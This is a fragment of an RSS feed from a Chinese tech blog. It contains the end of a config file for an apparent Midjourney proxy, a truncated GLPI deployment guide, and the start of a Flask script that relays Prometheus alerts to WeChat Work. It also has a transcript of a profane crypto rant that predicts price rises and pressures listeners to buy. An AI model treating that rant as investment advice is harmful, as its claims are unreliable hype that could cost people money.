<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "UserAgent"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "Enable"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// 是否默认启动</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "CoreSize"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// 并发数</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "QueueSize"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">10</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// 队列数</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "MaxQueueSize"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">100</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// 最大队列数</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "TimeoutMinutes"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">5</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// 任务超时分钟数</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "Mode"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">null</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// RELAX | FAST | TURBO 指定生成速度模式 --fast, --relax, or --turbo parameter at the end.</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "Weight"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> // 权重</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    },</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "NgDiscord"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: { </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// NG Discord 配置，默认可以为 null</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "Server"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "Cdn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "Wss"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "ResumeWss"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "UploadServer"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    },</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "Proxy"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: { </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// 代理配置，默认可以为 null</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "Host"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "Port"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">10809</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    },</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "Accounts"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [], </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// 账号池配置</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "BaiduTranslate"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: { </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// 百度翻译配置，默认可以为 null</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "Appid"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// your_appid</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "AppSecret"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> // your_app_secret</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    },</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "TranslateWay"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"NULL"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// NULL | GTP | BAIDU, 翻译配置, 默认: NULL</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "ApiSecret"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// your_api_secret</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "NotifyHook"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// your_notify_hook, 回调配置</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "NotifyPoolSize"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">10</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  },</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "Serilog"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "MinimumLevel"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "Default"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Information"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "Override"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "Default"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Warning"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "System"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Warning"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "Microsoft"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Warning"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">      }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    },</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "WriteTo"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">      {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "Name"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"File"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "Args"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">          "path"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"logs/log.txt"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">          "rollingInterval"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Day"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">          "fileSizeLimitBytes"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">null</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">          "rollOnFileSizeLimit"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">false</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">          "retainedFileCountLimit"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">31</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">      },</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">      {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">        "Name"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Console"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">      }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    ]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  },</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "Logging"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "LogLevel"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "Default"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Information"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "Microsoft.AspNetCore"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Warning"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  },</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "AllowedHosts"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"*"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "urls"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"http://*:8080"</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> // 默认端口</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>实际例子</h3>
<p><a href="http://midjounery.v-chat.cc" target="_blank" rel="noopener noreferrer">http://midjounery.v-chat.cc</a></p>
]]></content:encoded>
    </item>
    <item>
      <title>不抄底就回家种田</title>
      <link>https://www.geekery.cn/note-book/%E5%B8%81%E5%9C%88%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/%E4%B8%8D%E6%8A%84%E5%BA%95%E5%B0%B1%E5%9B%9E%E5%AE%B6%E7%A7%8D%E7%94%B0.html</link>
      <guid>https://www.geekery.cn/note-book/%E5%B8%81%E5%9C%88%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/%E4%B8%8D%E6%8A%84%E5%BA%95%E5%B0%B1%E5%9B%9E%E5%AE%B6%E7%A7%8D%E7%94%B0.html</guid>
      <source url="https://www.geekery.cn/rss.xml">不抄底就回家种田</source>
      <description>不抄底就回家种田 文字版 音视频</description>
      <pubDate>Thu, 18 Jul 2024 05:56:09 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>文字版</h2>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>[00：00.000 --&gt; 00：04.000] 别炒币了 别炒币了 回家耕田吧 真是的</span></span>
<span class="line"><span>[00: 04.000 --&gt; 00: 08.000] BNX他妈的两块钱的时候 你他妈你说怕追高</span></span>
<span class="line"><span>[00：08.000 --&gt; 00：12.000] 对不对 对不对 AXIE的时候他妈二十块 你他妈的已经他妈到顶了</span></span>
<span class="line"><span>[00：12.000 --&gt; 00：16.000] 对不对</span></span>
<span class="line"><span>[00：16.000 --&gt; 00：20.000] 飞船他妈跌到零点五毛的时候 你他妈说</span></span>
<span class="line"><span>[00：20.000 --&gt; 00：25.000] 项目方要跑了他妈的逼 现在六百多块美金</span></span>
<span class="line"><span>[00：25.000 --&gt; 00：29.000] 现在我他妈就告诉你们这个项目他妈的</span></span>
<span class="line"><span>[00：29.000 --&gt; 00：33.000] 会涨起来一百块美金 两百块美金 现在就是</span></span>
<span class="line"><span>[00：33.000 --&gt; 00：37.000] 他妈的抄底的机会 你怎么他妈的还不相信</span></span>
<span class="line"><span>[00：37.000 --&gt; 00：41.000] 还要错过多少次机会</span></span>
<span class="line"><span>[00：41.000 --&gt; 00：45.000] 人生会给你多少次机会</span></span>
<span class="line"><span>[00：45.000 --&gt; 00：51.000] 还不抄底 拿点胆子出来我草</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>音视频</h2>
]]></content:encoded>
    </item>
    <item>
      <title>Glpi-开源的IT资源管理平台部署</title>
      <link>https://www.geekery.cn/note-book/misc/Glpi-%E5%BC%80%E6%BA%90%E7%9A%84IT%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E9%83%A8%E7%BD%B2.html</link>
      <guid>https://www.geekery.cn/note-book/misc/Glpi-%E5%BC%80%E6%BA%90%E7%9A%84IT%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E9%83%A8%E7%BD%B2.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Glpi-开源的IT资源管理平台部署</source>
      <description>Glpi-开源的IT资源管理平台部署 GLPI 是一款免费的资产和IT管理软件套件，集数据中心管理、ITIL服务台、许可证跟踪和软件审计功能于一身。 部署前的准备 https://glpi-install.readthedocs.io/en/latest/prerequisites.html 为了部署和运行GLPI，以下是所需的系统要求和建议配置： 这...</description>
      <pubDate>Mon, 15 Jul 2024 07:34:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>GLPI 是一款免费的资产和IT管理软件套件，集数据中心管理、ITIL服务台、许可证跟踪和软件审计功能于一身。</p>
</blockquote>
<h2>部署前的准备</h2>
<blockquote>
<p>https://glpi-install.readthedocs.io/en/latest/prerequisites.html</p>
</blockquote>
<p>为了部署和运行GLPI，以下是所需的系统要求和建议配置：</p>
<p>| 要求类别      | 具体要求                        |
|</p>
]]></content:encoded>
    </item>
    <item>
      <title>Prometheus企业微信告警</title>
      <link>https://www.geekery.cn/note-book/Prometheus/Prometheus%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E5%91%8A%E8%AD%A6.html</link>
      <guid>https://www.geekery.cn/note-book/Prometheus/Prometheus%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E5%91%8A%E8%AD%A6.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Prometheus企业微信告警</source>
      <description>Prometheus企业微信告警 刚刚在微信的文件里看到的，不知道那个群里的。看起来是好用的脚本 脚本</description>
      <pubDate>Mon, 01 Jul 2024 02:13:26 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>刚刚在微信的文件里看到的，不知道那个群里的。看起来是好用的脚本</p>
</blockquote>
<h2>脚本</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">from</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flask</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> import</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Flask,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> request,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> jsonify</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">import</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> requests</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">import</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> json</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">app</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Flask</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">__name__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">def</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> send_message_to_enterprise_wechat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">message,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> color="info"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    enterprise_wechat_webhook</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=e936d170-44f7-4cd2-a62f-db9cbb6119xx"</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    headers</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {'Content-Type':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'application/json'}</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    data</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {"msgtype":</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "markdown",</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "markdown":</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {"content":</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> message}}</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    params</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {'key':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> enterprise_wechat_webhook,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'msgtype':</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'markdown'}</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    if</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> color</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "red":</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        params[</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'text'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "@all"</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        params[</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'content'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> message.replace</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"事件告警"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "&lt;font color='warning'&gt;事件告警&lt;/font&gt;"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    elif</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> color</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "green":</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        params[</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'text'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "@all"</span></span>
